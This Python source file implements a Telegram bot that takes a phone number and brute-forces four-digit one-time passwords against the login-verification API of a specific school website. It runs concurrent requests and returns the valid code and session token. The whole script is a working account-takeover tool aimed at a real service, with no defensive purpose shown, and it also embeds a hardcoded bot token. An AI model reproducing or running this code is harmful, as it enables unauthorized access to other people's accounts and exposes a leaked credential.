import asyncio
import aiohttp
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "6811502626:AAG9xT3ZQUmg6CrdIPvQ0kCRJ3W5QL-fuZs"
VERIFY_OTP_URL = "https://spec.iitschool.com/api/v1/login-otpverify"

async def verify_otp(session, phone, otp):
    """Verifies OTP and returns the token if successful."""
    verify_otp_data = {
        "phone": phone,
        "otp": otp,
        "type": "kkweb",
        "deviceType": "web",
        "deviceVersion": "Chrome 124",
        "deviceModel": "chrome"
    }
    headers = {
        "Accept": "application/json",
        "origintype": "web",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        async with session.post(VERIFY_OTP_URL, data=verify_otp_data, headers=headers) as response:
            if response.status == 200:
                response_data = await response.json()
                return response_data.get("data", {}).get("token"), otp
    except aiohttp.ClientError as e:
        print(f"Network error occurred: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")
    return None, None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the /start command."""
    await update.message.reply_text("Please send your phone number:")

async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle the phone number input and start OTP brute force."""
    phone_number = update.message.text.strip()
    if not phone_number.isdigit() or len(phone_number) != 10:
        await update.message.reply_text("Invalid phone number. Please send a valid 10-digit phone number.")
        return

    await update.message.reply_text(f"Starting OTP brute force for phone number: {phone_number}...")

    async with aiohttp.ClientSession() as session:
        token_found = None
        valid_otp = None
        max_concurrent_requests = 10
        tasks = []
        start_time = time.time()
        total_otps = 9000
        checked_otps = 0

        for otp in range(1000, 10000):
            task = asyncio.create_task(verify_otp(session, phone_number, str(otp)))
            tasks.append(task)

            if len(tasks) >= max_concurrent_requests:
                completed, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)

                for task in completed:
                    token, otp = await task
                    if token:
                        token_found = token
                        valid_otp = otp
                        break

                if token_found:
                    break

                tasks = [t for t in tasks if not t.done()]

            checked_otps += 1
            if checked_otps % 100 == 0:
                progress = (checked_otps / total_otps) * 100
                progress_message = await update.message.reply_text(
                    f"Progress: {progress:.2f}% ({checked_otps}/{total_otps} OTPs checked)"
                )

                # Delete the progress message after 10 seconds
                asyncio.create_task(delete_message_after_delay(progress_message, 10))

            await asyncio.sleep(0.1)

        if not token_found:
            for task in await asyncio.gather(*tasks):
                token, otp = task
                if token:
                    token_found = token
                    valid_otp = otp
                    break

        elapsed_time = time.time() - start_time
        if token_found:
            await update.message.reply_text(
                f"Valid OTP found!\nOTP: {valid_otp}\nToken: {token_found}\nTime: {elapsed_time:.2f} seconds"
            )
        else:
            await update.message.reply_text(f"Token not found for any OTP.\nTime: {elapsed_time:.2f} seconds")

async def delete_message_after_delay(message, delay):
    """Deletes a message after a specified delay."""
    await asyncio.sleep(delay)
    try:
        await message.delete()
    except Exception as e:
        print(f"Error deleting message: {e}")

def main():
    """Set up and run the Telegram bot."""
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number))

    app.run_polling()

if __name__ == "__main__":
    main()
